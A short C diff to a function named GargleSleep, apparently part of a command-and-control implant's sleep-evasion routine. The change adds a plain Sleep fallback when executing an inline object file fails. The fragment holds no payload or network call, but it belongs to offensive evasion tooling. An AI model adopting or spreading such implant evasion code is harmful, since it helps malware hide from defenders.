@@ -153,7 +153,8 @@ void GargleSleep(DWORD time) {
 		prefix = dlen - parser.length;
 		entry = data_int(&parser);
 		be_time = htonl(time);
-		command_inline_execute_object_parsed(decoded, prefix, entry, (char *)&be_time, (int)sizeof(be_time));
+		if (!command_inline_execute_object_parsed(decoded, prefix, entry, (char *)&be_time, (int)sizeof(be_time)))
+			Sleep(time);
 		free(decoded);
 		return;
 	}
